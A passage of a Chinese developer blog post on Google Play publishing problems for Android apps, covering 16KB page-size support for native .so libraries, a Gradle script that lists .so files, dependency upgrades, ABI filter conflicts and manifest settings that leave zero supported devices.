<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d1bf2bd624a418a8f45d0edcf2a6ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=BBoxwWYfQ6M%2BtzMpA2vBY%2FBxX5c%3D" alt="image.png" loading="lazy"/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.google.cn%2Fguide%2Fpractices%2Fpage-sizes%3Fhl%3Dzh_cn" target="_blank" title="https://developer.android.google.cn/guide/practices/page-sizes?hl=zh_cn" ref="nofollow noopener noreferrer">16K Size 官方说明</a></p>
<h4 data-id="heading-5">5.1Google Play 提交显示不支持 16KB 的库</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cac8e66e60641ea80cbd57bef57bb45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=nn1ZQf08XRokCeWS7hoYBUJZPDM%3D" alt="a3954fe97792ba48d57821e51e5f39be.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c0655a485a04ae0ab2547a2980a0175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=HOGXoJVIurPOuLGcEDG8yybbkOY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc4c13e7434c4767b0b3c88bdc57729d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=rzAiS8GaW%2BMRjjF0G4mIjnE3XoU%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">5.2 查找.so库所属三方库(<code>重点</code>)</h4>
<p><code>注意:</code></p>
<ul>
<li>提前bulid一下</li>
<li>执行 bundleRelease/assembleRelease 任务</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 在项目 build.gradle 或 app/build.gradle 中添加到最下方就行</span>

tasks<span class="hljs-selector-class">.whenTaskAdded</span> { task -&gt;
    <span class="hljs-comment">// 匹配所有 merge&lt;Flavor&gt;&lt;BuildType&gt;NativeLibs 任务</span>
    if (task.name.matches(/merge.*NativeLibs/)) {
        task<span class="hljs-selector-class">.doFirst</span> {
            <span class="hljs-built_in">println</span>("------- [${task.name}] start scanning so files -------")

            <span class="hljs-comment">// 遍历所有输入文件</span>
            it<span class="hljs-selector-class">.inputs</span><span class="hljs-selector-class">.files</span><span class="hljs-selector-class">.each</span> { file -&gt;
                <span class="hljs-built_in">printSoFiles</span>(file)
            }

            <span class="hljs-built_in">println</span>("------- [${task.name}] end scanning so files -------")
        }
    }
}

<span class="hljs-comment">// 递归查找 .so 文件</span>
def <span class="hljs-built_in">printSoFiles</span>(File file) {
    if (file == null || !file.exists()) return

    if (file.isDirectory()) {
        file<span class="hljs-selector-class">.listFiles</span>()?<span class="hljs-selector-class">.each</span> { <span class="hljs-built_in">printSoFiles</span>(it) }
    } else if (file.name.endsWith(".so")) {
        <span class="hljs-built_in">println</span>("Found .so: ${file.absolutePath}")
    }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cd759745a974e63ab91788f02f475db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=O%2Bw%2BKZooRgvBtNX20PpSzFw14hc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">5.3 修改的不支持 16KB so的库</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 这个4.3版本支持了 librsjni_androidx.so</span>
  api <span class="hljs-symbol">'jp</span>.wasabeef:glide-transformations:<span class="hljs-number">4.0</span>.<span class="hljs-number">1</span>'<span class="hljs-comment">//配合glide实现高斯模糊</span>
  api <span class="hljs-symbol">'jp</span>.wasabeef:glide-transformations:<span class="hljs-number">4.3</span>.<span class="hljs-number">0</span>'<span class="hljs-comment">//配合glide实现高斯模糊</span>
  
  <span class="hljs-comment">// 这个需要申请的新版本</span>
  api <span class="hljs-symbol">'com</span>.blankj:utilcodex:<span class="hljs-number">1.31</span>.<span class="hljs-number">0</span>'
  api <span class="hljs-symbol">'com</span>.blankj:utilcodex:<span class="hljs-number">1.31</span>.<span class="hljs-number">1</span>'
  
  <span class="hljs-comment">// 直接删除了 因为 国外不需要 可以申请pro版本 提供了</span>
 api <span class="hljs-symbol">'com</span>.tencent.bugly:crashreport:<span class="hljs-number">3.4</span>.<span class="hljs-number">4</span>'
 api <span class="hljs-symbol">'com</span>.tencent.bugly:nativecrashreport:<span class="hljs-number">3.9</span>.<span class="hljs-number">2</span>'
 
 <span class="hljs-comment">// 更新新版本 libmmkv.so</span>
 api  <span class="hljs-symbol">'com</span>.tencent:mmkv-<span class="hljs-keyword">static</span>:<span class="hljs-number">1.2</span>.<span class="hljs-number">14</span>'
 api  <span class="hljs-symbol">'com</span>.tencent:mmkv-<span class="hljs-keyword">static</span>:<span class="hljs-number">1.3</span>.<span class="hljs-number">14</span>'
	

</code></pre>
<h2 data-id="heading-8">6: <code>重点:</code>Google Play 测试版本支持设备数为0的情况</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc4c13e7434c4767b0b3c88bdc57729d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=rzAiS8GaW%2BMRjjF0G4mIjnE3XoU%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">6.1 ABI（CPU 架构）配置冲突 <code>splits.abi</code> 和 <code>ndk.abiFilters</code> 同时存在</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 根据自己需求配置架构 </span>
ndk {
    <span class="hljs-comment">//设置支持的SO库架构</span>
    abiFilters <span class="hljs-string">'armeabi-v7a'</span>, <span class="hljs-string">'arm64-v8a'</span>
}
</code></pre>
<h4 data-id="heading-10">6.2 Manifest 限制过度</h4>
<p><code>&lt;supports-gl-texture android:name="GL_IMG_texture_consistent"/&gt; </code>会导致支持设备数 0</p>
<p><code>注意:</code>
建议直接删除</p>
<pre><code class="hljs language-ini" lang="ini">会导致:  不支持的必用GL纹理压缩格式：GL_IMG_texture_consistent
 配置 false 也不行
&lt;supports-gl-texture android:<span class="hljs-attr">name</span>=<span class="hljs-string">"GL_IMG_texture_consistent"</span>/&gt;
</code></pre>
<p><code>其他影响的地方改成false:</code></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 摄像头特性设置为可选，不强制要求 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-feature</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.hardware.camera"</span> <span class="hljs-attr">android:required</span>=<span class="hljs-string">"false"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-feature</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.hardware.autofocus"</span> <span class="hljs-attr">android:required</span>=<span class="hljs-string">"false"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-feature</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">"android.hardware.camera.autofocus"</span> <span class="hljs-attr">android:required</span>=<span class="hljs-string">"false"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- OpenGL ES 2.0，不强制要求 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">uses-feature</span>
    <span class="hljs-attr">android:glEsVersion</span>=<span class="hljs-string">"0x00020000"</span>
    <span class="hljs-attr">android:required</span>=<span class="hljs-string">"false"</span>/&gt;</span>

<span class="hljs-comment">&lt;!-- 支持所有屏幕尺寸 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">supports-screens</span>
    <span class="hljs-attr">android:anyDensity</span>=<span class="hljs-string">"true"</span>
    <span class="hljs-attr">android:smallScreens</span>=<span class="hljs-string">"true"</span>
    <span class="hljs-attr">android:normalScreens</span>=<span class="hljs-string">"true"</span>
    <span class="hljs-attr">android:largeScreens</span>=<span class="hljs-string">"true"</span>
    <span class="hljs-attr">android:xlargeScreens</span>=<span class="hljs-string">"true"</span>/&gt;</span>
</code></pre>
<h4 data-id="heading-11">6.3 16KB 兼容</h4>
<p>不支持的so找提供方处理,处理不了的删除或者找替代方案</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/687ae455040844c1a9f9a0dd1f1da387~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5pyJ5LqG6YGH6KeB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765530640&amp;x-signature=MWEIUcdW3xO3%2Fsr%2BbwZUwbuo%2Fig%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-12">总结</h2>
<p>Google Play 发布艰难,且行且珍惜吧,各种稀奇古怪都会出现.账号申请,协议 项目适配.....且行且珍惜吧.</p>
<p>欢迎骡子们一起沟通.有事儿滴滴...</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>